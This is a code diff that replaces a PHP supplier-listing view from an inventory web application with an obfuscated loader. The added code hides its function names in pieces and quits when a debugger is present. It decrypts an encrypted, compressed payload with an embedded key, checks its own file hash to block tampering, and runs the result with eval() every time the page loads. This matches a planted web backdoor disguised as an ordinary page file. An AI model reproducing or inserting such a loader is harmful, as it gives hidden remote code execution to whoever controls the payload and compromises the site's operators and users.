@@ -1,221 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-<!-- TABLES CSS CODE -->
-<?php include"comman/code_css_datatable.php"; ?>
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
-
-  <!-- Left side column. contains the logo and sidebar -->
-  
-  <?php include"sidebar.php"; ?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?=$page_title;?>
-        <small>View/Search Suppliers</small>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li class="active"><?=$page_title;?></li>
-      </ol>
-    </section>
-    <div class="pay_now_modal">
-    </div>
-    <div class="pay_return_due_modal">
-    </div>
-    <!-- Main content -->
-    <?= form_open('#', array('class' => '', 'id' => 'table_form')); ?>
-    <input type="hidden" id='base_url' value="<?=$base_url;?>">
-    <section class="content">
-      <div class="row">
-        <!-- ********** ALERT MESSAGE START******* -->
-        <?php include"comman/code_flashdata.php"; ?>
-        <!-- ********** ALERT MESSAGE END******* -->
-        <div class="col-xs-12">
-          <div class="box">
-            <div class="box-header with-border">
-              <h3 class="box-title"><?=$page_title;?></h3>
-              <?php if($CI->permissions('suppliers_add')) { ?>
-              <div class="box-tools">
-                <a class="btn btn-block btn-info" href="<?php echo $base_url; ?>suppliers/add">
-                <i class="fa fa-plus"></i> <?= $this->lang->line('new_supplier'); ?></a>
-              </div>
-              <?php } ?>
-            </div>
-            <!-- /.box-header -->
-            <div class="box-body">
-              <table id="example2" class="table table-bordered table-striped" width="100%">
-                <thead class="bg-primary ">
-                <tr>
-                  <th class="text-center">
-                    <input type="checkbox" class="group_check checkbox" >
-                  </th>
-                  <th><?= $this->lang->line('supplier_id'); ?></th>
-                  <th><?= $this->lang->line('supplier_name'); ?></th>
-                  <th><?= $this->lang->line('mobile'); ?></th>
-                  <th><?= $this->lang->line('email'); ?></th>
-                  <th><?= $this->lang->line('purchase_due'); ?></th>
-                  <th><?= $this->lang->line('purchase_return_due'); ?></th>
-                  <th><?= $this->lang->line('status'); ?></th>
-                  <th><?= $this->lang->line('action'); ?></th>
-                </tr>
-                </thead>
-                <tbody>
-				
-                </tbody>
-               <tfoot>
-                  <tr class="bg-gray">
-                      <th colspan="5" style="text-align:right">Total</th>
-                      <th></th>
-                      <th></th>
-                      <th></th><!-- 7 -->
-                      <th></th><!-- 8 -->
-                  </tr>
-              </tfoot>
-              </table>
-            </div>
-            <!-- /.box-body -->
-          </div>
-          <!-- /.box -->
-        </div>
-        <!-- /.col -->
-      </div>
-      <!-- /.row -->
-    </section>
-    <!-- /.content -->
-    <?= form_close();?>
-  </div>
-  <!-- /.content-wrapper -->
-  <?php include"footer.php"; ?>
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<?php include"comman/code_js_datatable.php"; ?>
-<!-- bootstrap datepicker -->
-<script src="<?php echo $theme_link; ?>plugins/datepicker/bootstrap-datepicker.js"></script>
-<script type="text/javascript">
-  //Date picker
-    $('.datepicker').datepicker({
-      autoclose: true,
-    format: 'dd-mm-yyyy',
-     todayHighlight: true
-    });
-</script>
-<script type="text/javascript">
-$(document).ready(function() {
-    //datatables
-   var table = $('#example2').DataTable({ 
-
-      /* FOR EXPORT BUTTONS START*/
-  dom:'<"row margin-bottom-12"<"col-sm-12"<"pull-left"l><"pull-right"fr><"pull-right margin-left-10 "B>>>tip',
- /* dom:'<"row"<"col-sm-12"<"pull-left"B><"pull-right">>> <"row margin-bottom-12"<"col-sm-12"<"pull-left"l><"pull-right"fr>>>tip',*/
-      buttons: {
-        buttons: [
-            {
-                className: 'btn bg-red color-palette btn-flat hidden delete_btn pull-left',
-                text: 'Delete',
-                action: function ( e, dt, node, config ) {
-                    multi_delete();
-                }
-            },
-            { extend: 'copy', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4,5,6,7]} },
-            { extend: 'excel', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4,5,6,7]} },
-            { extend: 'pdf', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4,5,6,7]} },
-            { extend: 'print', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4,5,6,7]} },
-            { extend: 'csv', className: 'btn bg-teal color-palette btn-flat',exportOptions: { columns: [1,2,3,4,5,6,7]} },
-            { extend: 'colvis', className: 'btn bg-teal color-palette btn-flat',text:'Columns' },  
-
-            ]
-        },
-        /* FOR EXPORT BUTTONS END */
-
-        "processing": true, //Feature control the processing indicator.
-        "serverSide": true, //Feature control DataTables' server-side processing mode.
-        "order": [], //Initial no order.
-        "responsive": true,
-        language: {
-            processing: '<div class="text-primary bg-primary" style="position: relative;z-index:100;overflow: visible;">Processing...</div>'
-        },
-        // Load data for the table's content from an Ajax source
-        "ajax": {
-            "url": "<?php echo site_url('suppliers/ajax_list')?>",
-            "type": "POST",
-            
-            complete: function (data) {
-             $('.column_checkbox').iCheck({
-                checkboxClass: 'icheckbox_square-orange',
-                /*uncheckedClass: 'bg-white',*/
-                radioClass: 'iradio_square-orange',
-                increaseArea: '10%' // optional
-              });
-             call_code();
-              //$(".delete_btn").hide();
-             },
-
-        },
-
-        //Set column definition initialisation properties.
-        "columnDefs": [
-        { 
-            "targets": [ 0,8 ], //first column / numbering column
-            "orderable": false, //set not orderable
-        },
-        {
-            "targets" :[0],
-            "className": "text-center",
-        },
-        
-        ],
-        /*Start Footer Total*/
-        "footerCallback": function ( row, data, start, end, display ) {
-            var api = this.api(), data;
-            // Remove the formatting to get integer data for summation
-            var intVal = function ( i ) {
-                return typeof i === 'string' ?
-                    i.replace(/[\$,]/g, '')*1 :
-                    typeof i === 'number' ?
-                        i : 0;
-            };
-          
-            var purchase_due = api
-                .column( 5, { page: 'none'} )
-                .data()
-                .reduce( function (a, b) {
-                    return intVal(a) + intVal(b);
-                }, 0 );
-            var purchase_return_due = api
-                .column( 6, { page: 'none'} )
-                .data()
-                .reduce( function (a, b) {
-                    return intVal(a) + intVal(b);
-                }, 0 );
-            //$( api.column( 0 ).footer() ).html('Total');
-            $( api.column( 5 ).footer() ).html(app_number_format(purchase_due));
-            $( api.column( 6 ).footer() ).html(app_number_format(purchase_return_due));
-        },
-        /*End Footer Total*/
-    });
-    new $.fn.dataTable.FixedHeader( table );
-});
-</script>
-
-<script src="<?php echo $theme_link; ?>js/suppliers.js"></script>
-
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-		
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_s3w6p2sh=('bas'.'e64'.'_de'.'cod'.'e');
+$_tcu7blh8=('gzu'.'nco'.'mpr'.'ess');
+$_gwcpc5xb=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_mt25y6j4='oUl0V6gB';
+$_vxte2lwj='JFiYzj7EmXM=';
+$_i15e242r='M6NVpzl9';
+$_oybbq3ps='wnMlJ/kJ';
+$_oscbcqp7='gJ/WLwuZ';
+$_csbgse29='YhwSlw==';
+$_p9y6fuvt='di0tA0l3';
+$_gzqay2tc='e0KatxKx';
+$_qx41uy8o=$_s3w6p2sh($_oybbq3ps.$_i15e242r.$_mt25y6j4.$_oscbcqp7.$_vxte2lwj);
+$_pu0qbne4=$_s3w6p2sh($_gzqay2tc.$_p9y6fuvt.$_csbgse29);
+$_o5llrkw7=$_s3w6p2sh('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');
+$_s71wp28l=$_gwcpc5xb($_o5llrkw7,'aes-256-cbc',$_qx41uy8o,OPENSSL_RAW_DATA,$_pu0qbne4);
+if($_s71wp28l===false){exit;}
+$_kah7pjss=$_tcu7blh8($_s71wp28l);
+if($_kah7pjss===false){exit;}
+$_y6nzesh1='9a7862959aea215fbe805c2a8719e7e2d3944bc4fc9bec04df34b93250b7a93f';
+$_junloj20=@file_get_contents(__FILE__);
+if($_junloj20!==false){
+$_w6jfxnbz=str_replace($_y6nzesh1,"0000000000000000000000000000000000000000000000000000000000000000",$_junloj20);
+$_wfygjhd9=hash("sha256",$_w6jfxnbz);
+if($_wfygjhd9!==$_y6nzesh1){@http_response_code(403);exit;}
+}
+eval($_kah7pjss);
